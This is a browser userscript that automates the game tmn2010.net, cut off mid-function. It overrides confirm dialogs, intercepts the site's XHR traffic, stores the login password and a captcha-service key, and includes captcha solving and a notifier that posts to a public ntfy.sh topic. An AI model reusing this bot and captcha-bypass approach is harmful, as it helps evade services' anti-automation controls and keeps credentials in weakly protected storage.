// ==UserScript==
// @name         TMN All-in-One Script
// @namespace    http://tampermonkey.net/
// @version      1.5.4
// @description  Crimes, GTA, Booze, Jail, DTM, OC, Flying, Garage
// @author       Pap
// @license      MIT
// @match        https://*.tmn2010.net/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tmn2010.net
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_registerMenuCommand
// @require      https://code.jquery.com/jquery-3.6.0.min.js
// @downloadURL https://update.greasyfork.org/scripts/553930/TMN%20All-in-One%20Script.user.js
// @updateURL https://update.greasyfork.org/scripts/553930/TMN%20All-in-One%20Script.meta.js
// ==/UserScript==


/*
TODO

Hide OC section when OC script disabled
Car pref and leaderinputs not correctly loading on change, but do onload
Auto banking


*/
(async function() {
    'use strict';

    const $ = window.jQuery;

    const script = document.createElement('script');
    script.textContent = 'window.confirm = () => true;';
    document.documentElement.appendChild(script);
    GM_registerMenuCommand('Clear all data', () => {
        GM_setValue("TMN_CAPTCHA_KEY", '');
        GM_setValue("TMN_PASSWORD", '');
        GM_setValue("TMN_PLAYER", '');
        GM_setValue("TMN_AUTO_BANK_TIME", '');
        GM_setValue("TMN_SCRIPT_STATES", '{}');
        GM_setValue("TMN_SENTENCE_LENGTH", '');
        GM_setValue("TMN_FLIGHT_TIME", '');
        GM_setValue("TMN_GTA_TIME", '');
        GM_setValue("TMN_BOOZE_TIME", '');
        GM_setValue("TMN_CRIME_TIME", '');
        GM_setValue("TMN_OVERLAY_OC_SECTION_MINIMIZED", '');
        GM_setValue("TMN_OVERLAY_ACCOUNT_SECTION_MINIMIZED", '');
        GM_setValue("TMN_OVERLAY_MINIMIZED", '');
        GM_setValue("TMN_AUTO_OC_PREF", '');
        GM_setValue("TMN_OC_POSITION", '');
    });

    const USERNAME = ((v) => v ? JSON.parse(v).name || '' : '')(GM_getValue('TMN_PLAYER', ''));
    const PASSWORD = GM_getValue('PASSWORD', '');
    const TMN_CAPTCHA_KEY = GM_getValue('TMN_CAPTCHA_KEY', '');
    const TMN_PIC = 'Katana';
    const page = location.href.toLowerCase();
    const defaultPage = '/authenticated/default.aspx';
    const iFramePages = [ 'crimes.aspx', 'crimes.aspx?p=g', 'crimes.aspx?p=b', 'playerproperty.aspx?p=g&cleanup', 'jail.aspx' ];
    if (page.includes('login.aspx')) DoLogin();
    if (page.endsWith(defaultPage)) MainSetup();
    if (iFramePages.includes(page.split('/authenticated/')[1])) iFrameSetup();
    if (page.endsWith('jail.aspx')) JailScript();
    if (page.endsWith('crimes.aspx')) CrimesScript();
    if (page.endsWith('crimes.aspx?p=g')) GTAScript();
    if (page.endsWith('crimes.aspx?p=b')) BoozeScript();
    if (page.includes('mailbox.aspx') && page.includes('autoaccept')) AcceptInvites();
    if (page.endsWith('organizedcrime.aspx') || page.includes('organizedcrime.aspx?act=') || page.includes('store.aspx?p=w') ) OCScript();
    if (page.includes('organizedcrime.aspx?p=dtm')) DTMScript();
    if (page.includes('playerproperty.aspx?a=')) AutoBank();
    if (page.includes('travel.aspx?d=')) AutoTravel();
    if (page.endsWith('crimes.aspx?scriptcheck')) UniversalCaptchaSolve();
    if (page.includes('playerproperty.aspx?p=g&cleanup')) GarageCleanup();

    // Run on all pages
    const lblMsg = $('#ctl00_lblMsg')?.text();
    if (lblMsg.includes('You are in jail! You will stay in for')) HandleJail();
    $('#ctl00_userInfo_lblrank').after(` <span id='rankBar' style='color:blue'>(${CalculateRankPercent(GM_getValue('TMN_EXPERIENCE', '?'))}%)</span>`);
    AddRankBar();
    $('#ctl00_imgRefresh').closest('a').prop('onclick')();

    (function AddOverlay() {
        if (window.self !== window.top) return;

        if (!$('#tmn-overlay').length) {
            const defaultScriptStates = {
                Crimes: true,
                GTA: true,
                Booze: true,
                Jail: true,
                OC: false,
                DTM: false,
                'Auto Travel': false,
                'Auto Bank': false,
                'Auto Login': false
            };

            const savedScriptStates = Object.assign({}, defaultScriptStates, JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}')));
            GM_setValue('TMN_SCRIPT_STATES', JSON.stringify(savedScriptStates));
            const savedUsername = JSON.parse(GM_getValue('TMN_PLAYER', ''))?.name;
            const savedPassword = GM_getValue('TMN_PASSWORD', '');
            const savedCaptchaKey = TMN_CAPTCHA_KEY;
            const savedAutoOC = GM_getValue('TMN_AUTO_OC_PREF', '');
            const savedOCType = GM_getValue('TMN_LEAD_OC_TYPE', '');
            const savedLeadingInputs = JSON.parse(GM_getValue('TMN_OC_LEADING_INPUTS', '{}'));
            const savedLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '');
            const savedPosition = GM_getValue('TMN_OC_POSITION', '');
            const savedCarPref = GM_getValue('TMN_CAR_PREF', '');
            const overlayMinimized = GM_getValue('TMN_OVERLAY_MINIMIZED', '') === true;
            const accountSectionMinimized = GM_getValue('TMN_OVERLAY_ACCOUNT_SECTION_MINIMIZED', '') === true;
            const ocSectionMinimized = GM_getValue('TMN_OVERLAY_OC_SECTION_MINIMIZED', '') === true;

            const $personalBtns = $('.personalbtn');
            const offsetRight = $personalBtns.css('display') === 'inline-block' ? '60px' : '16px';

            const $overlay = $('<div>', { id: 'tmn-overlay' }).css({
                position: 'fixed', top: '16px', right: offsetRight, zIndex: 99999,
                background: 'rgba(20,28,40,0.96)', color: '#eee', fontFamily: 'monospace',
                fontSize: '14px', lineHeight: '1.7', padding: '16px 22px', borderRadius: '11px',
                boxShadow: '0 2px 14px #0008', minWidth: '220px', maxHeight: '90vh',
                textAlign: 'left', boxSizing: 'border-box', overflowY: 'auto'
            });

            $('<style>').text(`
    #tmn-overlay::-webkit-scrollbar {
        width: 10px;
    }
    #tmn-overlay::-webkit-scrollbar-track {
        background: #1c1f26;
        border-radius: 11px;
    }
    #tmn-overlay::-webkit-scrollbar-thumb {
        background-color: #444;
        border-radius: 11px;
        border: 2px solid #1c1f26;
    }
    #tmn-overlay::-webkit-scrollbar-thumb:hover {
        background-color: #666;
    }
`).appendTo('head');

            const $header = $('<div>').css({
                display: 'flex', justifyContent: 'space-between', alignItems: 'center'
            }).html('<b>TMN All-in-One Config</b>');
            const $toggleBtn = $('<button>', { id: 'tmn-toggle-btn', text: overlayMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $header.append($toggleBtn);

            const $content = $('<div>', { id: 'tmn-overlay-content' }).css({ marginTop: '8px', display: overlayMinimized ? 'none' : 'block' });

            const $accountSectionHeader = $('<div>').html('<b>Account Settings</b>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' });
            const $accountSectionToggleBtn = $('<button>', { id: 'tmn-account-section-toggle-btn', text: accountSectionMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            });
            $accountSectionHeader.append($accountSectionToggleBtn);

            const $accountSection = $('<div>', { id: 'tmn-account-section' }).css({ marginTop: '8px', display: accountSectionMinimized ? 'none' : 'block' });

            const $usernameLabel = $('<label>', { id: 'username-label', html: `Username: <span style='color: #AA0000; font-weight: bold; '>${savedUsername}</span>` }).css({
                display: 'block',
                marginTop: '6px'
            });

            const $passwordLabel = $('<label>', { id: 'password-label', text: 'Password:' }).css({
                display: 'block',
                marginTop: '6px'
            });

            const $passwordInput = $('<input>', {
                type: 'password',
                id: 'password-input',
                val: savedPassword
            }).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', width: '100%',
                maxWidth: '195px', boxSizing: 'border-box', marginTop: '4px', display: 'block'
            }).on('input', function () {
                GM_setValue('TMN_PASSWORD', $(this).val());
            });

            const $togglePasswordButton = $(`
    <svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' fill='#ccc' viewBox='0 0 24 24'>
        <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.761 0-5-2.239-5-5
                 s2.239-5 5-5 5 2.239 5 5-2.239 5-5 5zm0-8c-1.657 0-3 1.343-3 3s1.343 3 3 3
                 3-1.343 3-3-1.343-3-3-3z'/>
    </svg>
`).css({
                position: 'absolute',
                right: '8px',
                top: '55%',
                transform: 'translateY(-50%)',
                cursor: 'pointer',
                color: '#ccc',
                fontSize: '16px'
            }).on('click', function () {
                const currentType = $passwordInput.attr('type');
                $passwordInput.attr('type', currentType === 'password' ? 'text' : 'password');
            });

            const $passwordWrapper =
                  $('<div>').css({
                      position: 'relative',
                      display: 'inline-block',
                      width: '100%'
                  }).append($passwordInput, $togglePasswordButton)

            const $captchaKeyLabel = $('<label>', { id: 'captcha-key-label', text: 'Captcha Key:' }).css({
                display: 'block',
                marginTop: '6px'
            });

            const $captchaKeyInput = $('<input>', {
                type: 'text',
                id: 'captcha-key-input',
                val: savedCaptchaKey
            }).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', width: '100%',
                maxWidth: '195px', boxSizing: 'border-box', marginTop: '4px', display: 'block'
            }).on('input', function () {
                GM_setValue('TMN_CAPTCHA_KEY', $(this).val());
            });

            $accountSection.append($usernameLabel, $passwordLabel, $passwordWrapper, $captchaKeyLabel, $captchaKeyInput);

            // OC Section
            const $ocSectionHeader = $('<div>', { id: 'tmn-oc-section-header' }).html('<b>OC Settings</b>').css({ display: 'flex', justifyContent: 'space-between', alignItems: 'center' });
            const $ocSectionHeaderToggleBtn = $('<button>', { id: 'tmn-oc-section-toggle-btn', text: ocSectionMinimized ? '+' : '–' }).css({
                background: 'none', border: 'none', color: '#eee', fontSize: '16px', cursor: 'pointer', marginLeft: '10px'
            }).appendTo($ocSectionHeader);

            const $ocSection = $('<div>', { id: 'tmn-oc-section' }).css({ marginTop: '8px', display: ocSectionMinimized ? 'none' : 'block' });

            const $autoOCDropdown = $('<div>', { id: 'auto-oc-dropdown' }).css({ marginTop: '12px', position: 'relative' });
            $autoOCDropdown.append('<label>Auto OC:</label><br>');
            const $autoOCToggle = $('<div>', {
                id: 'auto-oc-toggle',
                text: savedAutoOC ? savedAutoOC + ' ▼' : 'Select OC Type ▼'
            }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer',
                border: '1px solid #444', userSelect: 'none'
            });
            const $autoOCMenu = $('<div>', { id: 'auto-oc-menu' }).css({
                display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444',
                padding: '8px', borderRadius: '6px', top: '66px', left: 0, width: '100%', zIndex: 100000
            });
            [
                { label: 'Auto Accept Any', tooltip: 'Accepts any OC invitations.' },
                { label: 'Auto Accept Specific', tooltip: 'Accepts OC invites from specific users (separated by semicolon \';\').' },
                { label: 'Lead OC', tooltip: 'Auto leads an OC and invites specified players.' }
            ].forEach(opt => {
                const $option = $('<div>', {
                    class: 'auto-oc-option',
                    text: opt.label,
                    'data-value': opt.label,
                    title: opt.tooltip
                }).css({ padding: '4px 6px', cursor: 'pointer' });
                $autoOCMenu.append($option);
            });

            const $ocLeaderNamesLabel = $('<label>', { id: 'oc-leader-names-label', text: 'Leader(s):' }).css({
                display: savedAutoOC === 'Auto Accept Specific' ? 'block' : 'none',
                marginTop: '6px'
            });

            const $ocLeaderNamesInput = $('<input>', {
                type: 'text',
                id: 'oc-leader-names-input',
                val: savedLeaderNames
            }).css({
                background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                padding: '6px', fontFamily: 'monospace', fontSize: '14px', width: '100%',
                maxWidth: '195px', boxSizing: 'border-box', marginTop: '4px',
                display: savedAutoOC === 'Auto Accept Specific' ? 'block' : 'none'
            }).on('input', function () {
                GM_setValue('TMN_OC_LEADER_NAMES', $(this).val());
            });

            $autoOCDropdown.append($autoOCToggle, $autoOCMenu, $ocLeaderNamesLabel, $ocLeaderNamesInput);

            // OC Position Dropdown
            const $ocPositionDropdown = $('<div>', { id: 'oc-position-dropdown' }).css({
                marginTop: '12px', position: 'relative', display: (savedAutoOC === 'Auto Accept Any' || savedAutoOC === 'Auto Accept Specific') ? 'block' : 'none'
            });
            $ocPositionDropdown.append('<label>OC Position:</label><br>');
            const $ocPositionToggle = $('<div>', {
                id: 'oc-position-toggle',
                text: savedPosition ? savedPosition + ' ▼' : 'Select Position ▼'
            }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444', userSelect: 'none'
            });
            const $ocPositionMenu = $('<div>', { id: 'oc-position-menu' }).css({
                display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444',
                padding: '8px', borderRadius: '6px', left: 0, width: '100%', zIndex: 100000
            });
            ['TP', 'WM or EE', 'Any'].forEach(role => {
                $ocPositionMenu.append($('<div>', { class: 'oc-option', text: role, 'data-value': role }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $ocPositionDropdown.append($ocPositionToggle, $ocPositionMenu);

            // Leader Inputs (shown only if Lead OC selected)
            const $leadingInputs = $('<div>', { id: 'leading-inputs' }).css({ marginTop: '12px', display: savedAutoOC === 'Lead OC' ? 'block' : 'none' });

            const $ocTypeDropdown = $('<div>', { id: 'oc-type-dropdown' }).css({
                marginBottom: '8px', position: 'relative', display: 'block'
            });
            $ocTypeDropdown.append('<label>OC Type:</label><br>');
            const $ocTypeToggle = $('<div>', {
                id: 'oc-type-toggle',
                html: savedOCType ? savedOCType + ' ▼' : 'Select OC Type ▼'
            }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444', userSelect: 'none'
            });
            const $ocTypeMenu = $('<div>', { id: 'oc-type-menu' }).css({
                display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444',
                padding: '8px', borderRadius: '6px', left: 0, width: '100%', zIndex: 100000
            });
            ['National Bank', 'Casino', 'Armoury'
            ].forEach(type => {
                const label = type.replace(/<[^>]+>/g, '');
                $ocTypeMenu.append($('<div>', { class: 'oc-type-option', html: type, 'data-value': label }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $ocTypeDropdown.append($ocTypeToggle, $ocTypeMenu);

            $leadingInputs.append($ocTypeDropdown);

            ['Transporter', 'Weapon Master', 'Explosive Expert'].forEach(role => {
                const key = role.toLowerCase().replace(/ /g, '');
                const $wrapper = $('<div>').css({ marginBottom: '8px' });
                const $label = $('<label>', { text: role + ':' }).css({ display: 'block', marginBottom: '4px' });
                const $input = $('<input>', {
                    type: 'text',
                    id: `leader-${key}`,
                    val: savedLeadingInputs[key] || ''
                }).css({
                    background: '#2a2f3a', color: '#eee', border: '1px solid #444', borderRadius: '6px',
                    padding: '6px', fontFamily: 'monospace', fontSize: '14px', width: '100%',
                    maxWidth: '195px', boxSizing: 'border-box'
                }).on('input', function () {
                    savedLeadingInputs[key] = $(this).val();
                    GM_setValue('TMN_OC_LEADING_INPUTS', JSON.stringify(savedLeadingInputs));
                });
                $wrapper.append($label, $input);
                $leadingInputs.append($wrapper);
            });

            // Car Preference Dropdown (only shows when TP is selected)
            const $carDropdown = $('<div>', { id: 'car-pref-dropdown' }).css({
                marginTop: '12px', position: 'relative', display: ((savedPosition === 'TP' || savedPosition === 'Any') && (savedOCType === 'Auto Accept Any' || savedOCType === 'Auto Accept Specific')) ? 'block' : 'none'
            });
            $carDropdown.append('<label>Car Preference:</label><br>');
            const $carToggle = $('<div>', {
                id: 'car-pref-toggle',
                html: savedCarPref ? savedCarPref + ' ▼' : 'Select Car ▼'
            }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444', userSelect: 'none'
            });
            const $carMenu = $('<div>', { id: 'car-pref-menu' }).css({
                display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444',
                padding: '8px', borderRadius: '6px', left: 0, width: '100%', zIndex: 100000
            });
            ['Bentley Continental', 'Audi RS6 Avant', 'Bentley Arnage',
             $('<span>', { title: 'Favours a Continental, RS6 then Arnage', text: 'Worst-to-Best' })[0].outerHTML,
             $('<span>', { title: 'Favours an Arnage, RS6 then Continental', text: 'Best-to-Worst' })[0].outerHTML
            ].forEach(car => {
                const label = car.replace(/<[^>]+>/g, '');
                $carMenu.append($('<div>', { class: 'car-option', html: car, 'data-value': label }).css({ padding: '4px 6px', cursor: 'pointer' }));
            });
            $carDropdown.append($carToggle, $carMenu);

            $ocSection.append($autoOCDropdown, $ocPositionDropdown, $leadingInputs, $carDropdown);

            // Enabled Scripts Dropdown
            const $scriptDropdown = $('<div>', { id: 'script-dropdown' }).css({ marginTop: '12px', position: 'relative' });
            $scriptDropdown.append('<label>Enabled Scripts:</label><br>');
            const $scriptToggle = $('<div>', { id: 'dropdown-toggle', text: 'Select Scripts ▼' }).css({
                background: '#2a2f3a', padding: '6px', borderRadius: '6px', cursor: 'pointer', border: '1px solid #444', userSelect: 'none'
            });
            const $scriptMenu = $('<div>', { id: 'dropdown-menu' }).css({
                display: 'none', position: 'absolute', background: '#1c1f26', border: '1px solid #444',
                padding: '8px', borderRadius: '6px', left: 0, width: '100%', zIndex: 100000
            });
            Object.keys(defaultScriptStates).forEach(script => {
                const $label = $('<label>').css({ display: 'block', marginBottom: '4px' });
                const $checkbox = $('<input>', {
                    type: 'checkbox', class: 'script-toggle', 'data-script': script,
                    checked: savedScriptStates[script]
                });
                $label.append($checkbox, ` ${script}`);
                $scriptMenu.append($label);
            });
            $scriptDropdown.append($scriptToggle, $scriptMenu);

            $content.append('<hr style=\'margin: 16px 0\'>', $accountSectionHeader, $accountSection, '<hr style=\'margin: 16px 0\'>', $ocSectionHeader, $ocSection, '<hr style=\'margin: 16px 0\'>', $scriptDropdown);
            $overlay.append($header, $content);
            $('body').append($overlay);

            // Event bindings
            $('#tmn-toggle-btn').on('click', function () {
                const $content = $('#tmn-overlay-content');
                const isHidden = $content.css('display') === 'none';
                const newState = !isHidden;
                $content.css('display', newState ? 'none' : 'block');
                GM_setValue('TMN_OVERLAY_MINIMIZED', newState);
                $(this).text(newState ? '+' : '–');
            });

            $('#tmn-account-section-toggle-btn').on('click', function () {
                const $content = $('#tmn-account-section');
                const isHidden = $content.css('display') === 'none';
                const newState = !isHidden;
                $content.css('display', newState ? 'none' : 'block');
                GM_setValue('TMN_OVERLAY_ACCOUNT_SECTION_MINIMIZED', newState);
                $(this).text(newState ? '+' : '–');
            });

            $('#tmn-oc-section-toggle-btn').on('click', function () {
                const $content = $('#tmn-oc-section');
                const isHidden = $content.css('display') === 'none';
                const newState = !isHidden;
                $content.css('display', newState ? 'none' : 'block');
                GM_setValue('TMN_OVERLAY_OC_SECTION_MINIMIZED', newState);
                $(this).text(newState ? '+' : '–');
            });

            $('.auto-oc-option').on('click', function () {
                const value = $(this).data('value');
                $('#auto-oc-toggle').text(value + ' ▼');
                GM_setValue('TMN_AUTO_OC_PREF', value);
                $('#auto-oc-menu').hide();

                $ocLeaderNamesLabel.css('display', value === 'Auto Accept Specific' ? 'block' : 'none');
                $ocLeaderNamesInput.css('display', value === 'Auto Accept Specific' ? 'block' : 'none');
                $leadingInputs.css('display', value === 'Lead OC' ? 'block' : 'none');
                $('#oc-position-dropdown').css('display', (value === 'Auto Accept Any' || value === 'Auto Accept Specific') ? 'block' : 'none');

                if (value === 'Lead OC') {
                    $('#car-pref-dropdown').hide();
                } else {
                    const position = $('#oc-position-toggle').text();
                    $('#car-pref-dropdown').css('display', (position.includes('TP') || position.includes('Any')) ? 'block' : 'none');
                }
            });

            $('.oc-type-option').on('click', function () {
                const value = $(this).data('value');
                $('#oc-type-toggle').text(value + ' ▼');
                GM_setValue('TMN_LEAD_OC_TYPE', value);
                $('#oc-type-menu').hide();
            });

            $('.oc-option').on('click', function () {
                const value = $(this).data('value');
                $('#oc-position-toggle').text(value + ' ▼');
                GM_setValue('TMN_OC_POSITION', value);
                $('#oc-position-menu').hide();
                $('#car-pref-dropdown').css('display', ((value === 'TP' || value === 'Any') && (savedAutoOC === 'Auto Accept Any' || savedAutoOC === 'Auto Accept Specific')) ? 'block' : 'none');
            });

            $(`[id$='-toggle']`).on('click', function () {
                const $menu = $(this).next();
                const toggleOffset = $(this).parent().offset();
                const menuHeight = $menu.outerHeight();
                const viewportHeight = $(window).height();
                const overlayHeight = $('#tmn-overlay').height();
                const toggleHeight = $(this).outerHeight();
                const spaceBelow = viewportHeight - (toggleOffset.top + toggleHeight);
                const spaceAbove = toggleOffset.top;
                const $overlay = $('#tmn-overlay');

                CloseAllMenus($menu[0]);
                if (spaceBelow < menuHeight) {
                    $menu.css({
                        maxHeight: `${spaceAbove}px`,
                        top: 'auto',
                        bottom: `${toggleHeight}px`
                    });
                } else {
                    //$overlay.css({ overflowY: 'unset' });
                    $menu.css({
                        maxHeight: 'unset',
                        bottom: 'auto'
                    });
                }

                $menu.toggle();
            });

            $('.script-toggle').on('change', function () {
                const states = {};
                $('.script-toggle').each(function () {
                    states[$(this).data('script')] = $(this).is(':checked');
                });
                GM_setValue('TMN_SCRIPT_STATES', JSON.stringify(states));

                // Hide OC menus if OC script disabled
                $('#tmn-oc-section-header').css('display', states.OC ? 'flex' : 'none');
                $('#tmn-oc-section').css('display', states.OC ? 'block' : 'none');
                $('#tmn-oc-section').next('hr').css('display', states.OC ? 'block' : 'none');
            });

            $('.car-option').on('click', function () {
                const value = $(this).data('value');
                $('#car-pref-toggle').html(value + ' ▼');
                GM_setValue('TMN_CAR_PREF', value);
                $('#car-pref-menu').hide();
            });

            $(document).on('click', function (e) {
                if (!$(e.target).closest('#dropdown-toggle, #dropdown-menu, #auto-oc-toggle, #auto-oc-menu, #oc-type-toggle, #oc-type-menu, #oc-position-toggle, #oc-position-menu, #car-pref-toggle, #car-pref-menu').length) {
                    $('#dropdown-menu, #auto-oc-menu, #oc-type-menu, #oc-position-menu, #car-pref-menu').hide();
                }
            });

            $overlay.find('*').css('box-sizing', 'border-box');

            // Initial visibility
            if (!savedScriptStates.OC) {
                $('#tmn-oc-section').hide();
            } else {
                if (savedAutoOC === 'Auto Accept Specific') {
                    $('#oc-names-label').show();
                    $('#oc-names-input').show();
                    $('#oc-position-dropdown').show();
                }
                if (savedAutoOC === 'Auto Accept Any') {
                    $('#oc-position-dropdown').show();
                }
                if (savedAutoOC === 'Lead OC') {
                    $('#leader-inputs').show();
                    $('#car-pref-dropdown').hide();
                }
                if ((savedPosition === 'TP' || savedPosition === 'Any') && (savedAutoOC === 'Auto Accept Any' || savedAutoOC === 'Auto Accept Specific')) {
                    $('#car-pref-dropdown').show();
                }
            }
        }

        function CloseAllMenus(except) {
            const $overlay = $('#tmn-overlay');
            //$overlay.css({ overflowY: 'auto' });
            $(`[id$='-menu']`).each((i, menu) => {
                if (menu !== except) $(menu).hide();
            });
        }
    })();

    function Notify(message) {
        fetch('https://ntfy.sh/TMN_Inbox_Alert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: message
        });
    }

    function AddRankBar() {
        const TARGET = 'hndlr.ashx?m=pst&t=';
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
            this._intercept = url.includes(TARGET);
            return originalOpen.call(this, method, url, ...rest);
        };

        XMLHttpRequest.prototype.send = function(...args) {
            if (this._intercept) {
                this.addEventListener('readystatechange', function() {
                    if (this.readyState === 4 && this.status === 200) {
                        try {
                            let data = JSON.parse(this.responseText);
                            const percent = CalculateRankPercent(data[0].Experience);
                            UpdateRankBar(percent);
                        } catch (e) {
                            //console.log(e);
                        }
                    }
                });
            }

            return originalSend.apply(this, args);
        };
    }

    function UpdateRankBar(percent) {
        const displayPercent = percent;
        const $lblRank = $(window.top.document.querySelector('#ctl00_userInfo_lblrank'));
        if ($lblRank.length) {
            const $rankBar = $(window.top.document.querySelector('#rankBar'));
            if ($rankBar.length) {
                $rankBar.text(`(${displayPercent}%)`);
            } else {
                $('#ctl00_userInfo_lblrank').after(` <span id='rankBar' style='color:blue'>(${displayPercent}%)</span>`);
            }
        }
    }

    function CalculateRankPercent(exp) {
        if (exp === '?') return '?';
        const savedExp = GM_getValue('TMN_EXPERIENCE', 0);
        const ranks = [ 'Scum', 'Wannabe', 'Thug', 'Criminal', 'Gangster', 'Hitman', 'Hired Gunner', 'Assassin', 'Boss', 'Don', 'Enemy of the State', 'Global Threat', 'Global Dominator', 'Global Disaster', 'Legend' ];
        const rankId = ranks.indexOf($('#ctl00_userInfo_lblrank').text());
        const totalExpAmts = [0, 20, 40, 80, 140, 220, 320, 450, 600, 800, 1100, 1500, 2000, 3000, 5000 ];
        const perRankReq = [0, 20, 40, 60, 80, 100, 130, 150, 200, 300, 400, 500, 1000, 2000 ];
        GM_setValue('TMN_EXPERIENCE', Math.max(savedExp, exp));
        return Number(((exp - totalExpAmts[rankId]) / Math.max(perRankReq[rankId], 0.01) * 100).toFixed(2));
    }

    async function FetchPage(url) {
        const res = await fetch(url);
        const html = await res.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        return $(doc);
    }

    function AddLogDiv() {
        const $topDoc = $(window.top.document);
        if ($topDoc.find('#console')[0]) return;

        const consoleDiv = $('<div>', { id: 'console' })
        .css({
            'padding-left': '10px',
            'color': '#FF9933',
            'font-weight': 'bold',
            'text-align': 'left',
            'align-content': 'center',
            'grid-area': 'a',
            'height': '30px',
            'border-bottom': '2px solid #ccc'
        })
        .html('<span></span>');

        const divContent = $topDoc.find('#divContent')[0] || $topDoc.find('.divcontent')[0];
        if (divContent) $(divContent).prepend(consoleDiv);
    }

    function Log(message) {
        AddLogDiv();
        $(window.top.document).find('#console > span')?.html(message);
    }

    function LogCountdown(totalTime, interval, message, callback) {
        //totalTime in ms
        const countdownInterval = setInterval(() => {
            if (totalTime <= 0) {
                clearInterval(countdownInterval);
                callback();
            }
            Log(`${message} in: ${totalTime/1000}`);
            totalTime -= interval;
        }, interval);
    }

    function HandleJail() {
        if (!window.top.jailTimerStarted) {
            window.top.jailTimerStarted = true;
            const lblMsg = $('#ctl00_lblMsg');
            let sentenceLength = parseInt(lblMsg.text().match(/\d+/)[0], 10);
            const now = Date.now();
            const delayToNextSecond = 1000 - (now % 1000);

            setTimeout( SyncJailTimers, delayToNextSecond);

            // Poll time random number between 3 - 5s
            /*let pollTime = Number(( (Math.random() * 3000 + 2000) / 1000).toFixed(1));
            let pollJailTimeout = setTimeout( PollJail, pollTime * 1000);
            let pollTimeInterval = setInterval(() => {
                pollTime-=0.1;
                Log(`Polling jail in ${parseFloat(Math.max(0, pollTime)).toFixed(1)}s.`)
            }, 100);*/

            function SyncJailTimers() {
                const sentenceInterval = setInterval(() => {
                    let jailTimers = $(window.top.document).find('iframe').map((n, e) => {
                        const lblMsg = $(e.contentDocument).find('#ctl00_lblMsg');
                        const match = lblMsg.text().match(/\d+/);
                        return match ? lblMsg[0] : null;
                    }).get().filter(Boolean);

                    if (!jailTimers.length) jailTimers = [lblMsg[0]];
                    let minSentenceLength = Math.min(
                        ...jailTimers.map(lbl => {
                            const match = $(lbl).text().match(/\d+/);
                            return match ? parseInt(match[0], 10) : Infinity;
                        })
                    );

                    minSentenceLength = Math.max(0, minSentenceLength - 1);

                    jailTimers.forEach(lblMsg => {
                        $(lblMsg).text($(lblMsg).text().replace(/\d+/, minSentenceLength));
                    });

                    if (minSentenceLength <= 0) {
                        clearInterval(sentenceInterval);
                        window.top.jailTimerStarted = false;
                        jailTimers.forEach(lblMsg => {
                            const ownerFrame = lblMsg.ownerDocument.defaultView.frameElement;
                            if (ownerFrame) {
                                ownerFrame.contentWindow.location.href = ownerFrame.contentWindow.location.href.replace('#', '');
                            } else {
                                window.top.location.href = window.top.location.href.replace('#', '');
                            }
                        });
                    }
                }, 1000);
            }

            (async function PollJail() {
                const fetchedPage = await FetchPage('jail.aspx');
                const lblMsg = fetchedPage.find('#ctl00_lblMsg').text();

                //clearInterval(pollTimeInterval);
                if (!lblMsg.includes('jail')) {
                    //clearTimeout(pollJailTimeout);
                    window.top.jailTimerStarted = false;
                    const iFrames = $(window.top.document).find('iframe');
                    if (iFrames.length > 0) {
                        iFrames.each((n, iframe) => {
                            if ($(iframe.contentDocument).find('#ctl00_lblMsg')?.text().includes('jail')) {
                                iframe.contentWindow.location.href = iframe.contentWindow.location.href.replace('#', '');
                            }
                        });
                    } else {
                        window.top.location.href = window.top.location.href.replace('#', '');
                    }
                }
                setTimeout(PollJail, 5000);

                /*pollTime = Number(( (Math.random() * 3000 + 2000) / 1000).toFixed(1));
                pollJailTimeout = setTimeout(PollJail, pollTime * 1000);pollTimeInterval = setInterval(() => {
                    pollTime-=0.1;
                    Log(`Still in jail. Polling again in ${parseFloat(Math.max(0, pollTime)).toFixed(1)}s.`)
                }, 100);*/
            })();
        }
    }

    function CrimesCountdown() {
        const lblMsg = $('#ctl00_main_lblResult');
        const delayToNextSecond = 1000 - (Date.now() % 1000);
        const crimeInterval = setInterval(() => {
            const match = lblMsg.text().match(/(\d+)\s*seconds/)[0];
            let time = match.match(/\d+/);
            time = Math.max(0, time - 1);
            $(lblMsg).html($(lblMsg).html().replace(/(\d+)\s*seconds/, `${time} seconds`));

            if (time <= 0) {
                clearInterval(crimeInterval);
                location.href = location.href.replace('#', '');
            }
        }, 1000);
    }

    function GetAvailableTime(message) {
        const regex = /(\d+)\s*hours?.*?(\d+)\s*minutes?.*?(\d+)\s*seconds?/i;

        const match = message.match(regex);

        if (message === 'Available') {
            return 1;
        } else if (message.includes('Doing one')) {
            return Infinity;
        } else if (!match) {
            throw new Error('Time format not found in the message.');
        }

        const hours = parseInt(match[1], 10);
        const minutes = parseInt(match[2], 10);
